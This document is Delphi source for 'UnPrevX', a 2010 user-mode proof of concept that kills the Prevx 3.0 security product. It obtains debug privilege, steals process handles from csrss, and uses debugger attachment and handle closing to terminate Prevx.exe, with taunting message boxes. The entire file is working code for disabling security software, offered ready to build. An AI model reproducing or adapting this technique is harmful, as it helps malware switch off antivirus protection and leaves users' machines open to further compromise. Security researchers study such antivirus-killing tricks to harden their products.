//{$DEFINE minimum}
{$E exe}
{$IMAGEBASE $00400000}
{$R-}
{$Q-}

{$IFDEF minimum}
program UnPrevx;
{$ENDIF}
{$IFNDEF minimum}
unit UnPrevx;
interface
implementation
{$ENDIF}

{$R version.res}

uses
  Windows, RTL, WinNative;

const
  Title: PWideChar = 'UnPrevX 1.0.185 (04.08.2010)';
  ProcessesMaxID = 1;
  TargetProcesses: array[0..ProcessesMaxID] of PWideChar = ('Prevx.exe', '');

type
  _SYSINFOBUF = record
    uHandleCount: ULONG;
    rHandleTable: array[0..0] of SYSTEM_HANDLE_INFORMATION;
  end;
  SYSINFOBUF = _SYSINFOBUF;
  PSYSINFOBUF = ^_SYSINFOBUF;

var
  ProcessHandles: array[0..31] of THANDLE;
  ProcessesID: array[0..ProcessesMaxID] of DWORD;
  ProcessHandlesCount: integer = 0;
  SnapShotHandle: THANDLE;
  pBuffer: PROCESSENTRY32W;

function FillProcessesArray(): boolean;
var
  CsrProcess: THANDLE;
  bFound: boolean;
  bytesIO: ULONG;
  buf: PSYSINFOBUF;
  last, i, c: integer;
  pbi: PROCESS_BASIC_INFORMATION;
  CsrPID: DWORD;
  Status: NTSTATUS;
  cid1: CLIENT_ID;
  attr: OBJECT_ATTRIBUTES;
begin
  result := false;
  CsrPID := CsrGetProcessId();
  if (CsrPID = 0) then exit;

  cid1.UniqueProcess := CsrPID;
  cid1.UniqueThread := 0;
  InitializeObjectAttributes(@attr, nil, 0, 0);
  Status := ZwOpenProcess(@CsrProcess, PROCESS_ALL_ACCESS, @attr, @cid1);
  if (Status <> STATUS_SUCCESS) then exit;


  ProcessHandlesCount := 0;
  memzero(@ProcessesID, sizeof(ProcessesID));
  memzero(@ProcessHandles, sizeof(ProcessHandles));

  last := 0;
  pBuffer.dwSize := sizeof(PROCESSENTRY32W);
  SnapShotHandle := CreateToolHelp32SnapShot(TH32CS_SNAPPROCESS, 0);
  if (SnapShotHandle <> INVALID_HANDLE_VALUE) then
  begin
    if Process32FirstW(SnapShotHandle, @pBuffer) then
      repeat


        for i := 0 to ProcessesMaxID - 1 do
        begin
          if (strcmpiW(pBuffer.szExeFile, TargetProcesses[i]) = 0) then
          begin
            ProcessesID[last] := pBuffer.th32ProcessID;
            inc(last);
          end;
        end;

      until (not Process32NextW(SnapShotHandle, @pBuffer));
    CloseHandle(SnapShotHandle);
  end;

  bytesIO := 4194304;
  buf := nil;
  ZwAllocateVirtualMemory(DWORD(-1), @buf, 0, @bytesIO, MEM_COMMIT, PAGE_READWRITE);
  if (buf <> nil) then
  begin

    ZwQuerySystemInformation(SystemHandleInformation, buf, 4194304, @bytesIO);
    for c := 0 to Integer(buf^.uHandleCount) - 1 do
      if (buf^.rHandleTable[c].ProcessId = CsrPID) and (buf^.rHandleTable[c].ObjectTypeNumber = 5) then
      begin

        Status := ZwDuplicateObject(CsrProcess, buf^.rHandleTable[c].Handle, DWORD(-1), @ProcessHandles[ProcessHandlesCount], 0, 0, DUPLICATE_SAME_ACCESS);
        if (Status = STATUS_SUCCESS) then
        begin

          bFound := false;
          if (ZwQueryInformationProcess(ProcessHandles[ProcessHandlesCount], ProcessBasicInformation, @pbi, sizeof(pbi), @bytesIO) = STATUS_SUCCESS) then
          begin

            for i := 0 to ProcessesMaxID do
              if (pbi.UniqueProcessId = ProcessesID[i]) then
              begin
                bFound := true;
                inc(ProcessHandlesCount);
                break;
              end;

          end;
          if not bFound then
          begin
            ZwClose(ProcessHandles[ProcessHandlesCount]);
            ProcessHandles[ProcessHandlesCount] := 0;
          end;

        end;
      end;
    bytesIO := 0;
    ZwFreeVirtualMemory(NtCurrentProcess, @buf, @bytesIO, MEM_RELEASE);
  end;
  result := (ProcessHandlesCount > 0);
  ZwClose(CsrProcess);

end;

procedure KillProcesses();
var
  i: integer;
  bytesIO: DWORD;
  buf: PSYSINFOBUF;
begin
  if (DbgUiConnectToDbg() <> STATUS_SUCCESS) then exit;

  for i := 0 to ProcessHandlesCount - 1 do
  begin
    if (DbgUiDebugActiveProcess(ProcessHandles[i]) = STATUS_SUCCESS) then
      ZwClose(ProcessHandles[i]);
  end;
  bytesIO := 4194304;
  buf := nil;
  ZwAllocateVirtualMemory(NtCurrentProcess, @buf, 0, @bytesIO, MEM_COMMIT, PAGE_READWRITE);
  ZwQuerySystemInformation(SystemHandleInformation, buf, 4194304, @bytesIO);
  for i := 0 to buf^.uHandleCount - 1 do
    if (buf^.rHandleTable[i].ProcessId = NtGetCurrentProcessId()) then
    begin
      if (buf^.rHandleTable[i].ObjectTypeNumber = $8) then
      begin
        if (ZwClose(buf^.rHandleTable[i].Handle) = STATUS_SUCCESS) then MessageBoxW(0, 'See you in hell LOL', Title, MB_ICONWARNING);
        break;
      end;
    end;
  bytesIO := 0;
  ZwFreeVirtualMemory(NtCurrentProcess, @buf, @bytesIO, MEM_RELEASE);
end;

var
  prev: integer;
  osver: OSVERSIONINFOEXW;
begin
  if (MessageBoxW(GetDesktopWindow(), 'User mode proof-of-concept Prevx 3.0 kill'#13#10 +
    'Fucking handles/SSDT/Shadow SSDT will not help Prevx!'#13#13#10 +
    'Yes to continue, No to exit program'#13#10 +
    '(c) 2010 by EP_X0FF', Title, MB_YESNO) = IDNO) then exit;


  osver.old.dwOSVersionInfoSize := sizeof(osver.old);
  RtlGetVersion(@osver);
  if (osver.old.dwBuildNumber <> 2600) then
  begin
    MessageBoxW(0, 'Unsupported OS <Всем_похуй>', nil, MB_OK);
  end;

  if (RtlAdjustPrivilege(SE_DEBUG_PRIVILEGE, TRUE, FALSE, @prev) <> STATUS_SUCCESS) then
  begin
    MessageBoxW(0, 'Cannot get more privilegies', Title, MB_OK);
    ExitProcess(0);
  end;
  if (FillProcessesArray()) then
  begin
    MessageBoxW(GetDesktopWindow(), 'Prevx located, let''s do some fun with it', Title, MB_ICONINFORMATION);
    KillProcesses();
    MessageBoxW(0, 'That''s all folks, keep hooking =))', Title, MB_OK);
  end else MessageBoxW(0, 'Prevx not found, start it first =)', Title, MB_OK);
end.


